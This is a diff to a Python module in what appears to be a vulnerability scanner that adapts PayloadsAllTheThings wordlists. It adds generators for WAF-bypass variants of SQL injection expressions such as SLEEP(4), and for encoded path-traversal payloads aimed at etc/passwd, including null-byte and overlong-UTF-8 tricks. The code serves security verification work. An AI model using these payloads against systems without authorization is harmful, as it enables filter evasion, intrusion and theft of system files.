@@ -1,4 +1,4 @@
-"""Carga en tiempo de ejecucion las wordlists REALES de PayloadsAllTheThings committeadas en
+"""Payload knowledge-base: carga wordlists REALES de PayloadsAllTheThings committeadas en
 `payload_kb/` (ver `payload_kb/ATTRIBUTION.md`) y las generaliza: cada linea trae un marcador fijo
 de los propios autores (un `alert(NNNN)` concreto, un `7*7` concreto, un host `google.com`
 concreto...) que aqui se sustituye por el canario/secreto/host ALEATORIO que cada verificador
@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import os
 import re
+import urllib.parse
 from typing import List
 
 _DATA_DIR = os.path.join(os.path.dirname(__file__), "payload_kb")
@@ -158,4 +159,146 @@ def load_open_redirect_templates(evil_host: str) -> List[str]:
             if matched and replaced not in seen:
                 seen.add(replaced)
                 out.append(replaced)
+    return out
+
+
+# ---------------------------------------------------------------------------
+# WAF bypass: SQLi expression encoding variants
+# ---------------------------------------------------------------------------
+# Genera variantes de bypass de WAF para una expresion SQL dada (p.ej. SLEEP(4)).
+# Tecnicas:
+#   case: variacion de mayusculas/minusculas  (SLeeP(4))
+#   comment: comentarios inline MySQL          (SL/**/EEP(4))
+#   plus:    concatenacion MySQL via +         (SL+EEP(4)) [MySQL specific]
+#   percent: URL-encoding de un caracter       (SL%45EP(4))
+#   double:  doble URL-encoding                (SL%2545EP(4))
+#
+# Las variantes se mantienen sin evaluar: el llamador decide cuales probar.
+# No se generan variantes que involucren caracteres control/null que no sean
+# semanticamente equivalentes en MySQL/Postgres.
+
+def load_sqli_waf_bypass_variants(expression: str) -> List[str]:
+    """Genera variantes de bypass de WAF para `expression` (p.ej. 'SLEEP(4)').
+
+    Devuelve una lista DEDUPLICADA de variantes: maiusculas alternadas, comentarios
+    inline MySQL (/**/) entre letras consecutivas de la palabra clave, URL-encoding
+    de un caracter, y doble-encoding.  Nunca devuelve la expresion original tal cual
+    -- el llamador ya la tiene y la prueba primero.
+    """
+    out: List[str] = []
+    seen: set = set()
+
+    def _add(v: str) -> None:
+        if v and v != expression and v not in seen:
+            seen.add(v)
+            out.append(v)
+
+    # 1. Case variation: alterna mayusculas en letras de la palabra clave
+    # (funciona en MySQL y en la mayoria de bases de datos SQL insensibles a casos)
+    cased = ""
+    toggle = True
+    for ch in expression:
+        if ch.isalpha():
+            cased += ch.upper() if toggle else ch.lower()
+            toggle = not toggle
+        else:
+            cased += ch
+    _add(cased)
+
+    # 2. Inline MySQL comment after each letter of leading keyword
+    # e.g. SLEEP(4) -> S/**/L/**/E/**/E/**/P/**/(4)
+    # Solo se aplica a la primera secuencia alfa del payload (el nombre de funcion)
+    m = re.match(r'^([A-Za-z_]+)(.*)', expression)
+    if m:
+        kw, rest = m.group(1), m.group(2)
+        with_comments = "/**/".join(list(kw)) + rest
+        _add(with_comments)
+        # Version mas ligera: comentario solo al inicio de la palabra
+        _add("/**/" + expression)
+
+    # 3. URL-encode the first alpha character (simula bypass de IDS que no normaliza)
+    for i, ch in enumerate(expression):
+        if ch.isalpha():
+            encoded_ch = urllib.parse.quote(ch, safe='')
+            _add(expression[:i] + encoded_ch + expression[i + 1:])
+            # Double-encoding
+            _add(expression[:i] + urllib.parse.quote(encoded_ch, safe='') + expression[i + 1:])
+            break
+
+    # 4. MySQL whitespace bypass: tab \t y newline \n como sustitutos de espacio
+    if " " in expression:
+        _add(expression.replace(" ", "\t"))
+        _add(expression.replace(" ", "\n"))
+        _add(expression.replace(" ", "/**/"))
+
+    return out
+
+
+# ---------------------------------------------------------------------------
+# WAF bypass: path traversal encoding variants
+# ---------------------------------------------------------------------------
+# Para LFI / path traversal: genera variantes de encoding del separador '../'
+# y del payload completo, manteniendo la misma profundidad de directorio.
+# Tecnicas:
+#   double_dot:   ....//....// (doble punto + slash doble)
+#   url_enc:      %2e%2e%2f (URL-encoding de ../)
+#   double_enc:   %252e%252e%252f (doble URL-encoding)
+#   null_byte:    ../../../etc/passwd%00 (null byte para truncar extension)
+#   utf8:         ..%c0%af (overlong UTF-8 encoding de /)
+#   win_path:     ..\..\ (rutas Windows con backslash)
+
+def load_path_traversal_encodings(depth: int, target: str = "etc/passwd") -> List[str]:
+    """Genera variantes de path traversal para `depth` niveles hacia el target.
+
+    `depth`: numero de '../' que se concatenan (tipicamente 4-8)
+    `target`: fichero destino sin '/' inicial (default 'etc/passwd')
+
+    Devuelve una lista DEDUPLICADA de payloads listos para inyectar en el
+    parametro de ruta del verificador.  El payload estandar '../' * depth +
+    target ya lo genera el verificador -- estas son las variantes de encoding.
+    """
+    standard = "../" * depth + target
+    out: List[str] = []
+    seen: set = {standard}
+
+    def _add(v: str) -> None:
+        if v and v not in seen:
+            seen.add(v)
+            out.append(v)
+
+    # 1. Double-dot double-slash: ....//  (elude filtros que solo eliminan '../')
+    _add(("....//") * depth + target)
+
+    # 2. URL-encoded separator: %2e%2e%2f
+    url_sep = "%2e%2e%2f"
+    _add(url_sep * depth + target)
+
+    # 3. Mixed: ..%2f (solo el slash codificado)
+    _add(("..%2f") * depth + target)
+
+    # 4. Double URL-encoded: %252e%252e%252f
+    double_sep = "%252e%252e%252f"
+    _add(double_sep * depth + target)
+
+    # 5. Null byte truncation (PHP < 5.3.4)
+    _add(standard + "%00")
+    _add(standard + "\x00")
+
+    # 6. Overlong UTF-8 for /: %c0%af  (funciona en algunas implementaciones Java)
+    _add(("..%c0%af") * depth + target)
+
+    # 7. Windows paths (backslash)
+    win_sep = "..\\"
+    _add(win_sep * depth + target.replace("/", "\\"))
+    _add(("..%5c") * depth + target.replace("/", "%5c"))
+
+    # 8. URL-encode the full payload (doble encoding del payload completo)
+    _add(urllib.parse.quote(standard, safe=''))
+
+    # 9. Inject extra slashes: ./../ (elude algunos filtros que buscan '../')
+    _add(("./../") * depth + target)
+
+    # 10. Unicode separators: %u2215 (DIVISION SLASH, Windows IIS)
+    _add(("..%u2215") * depth + target)
+
     return out
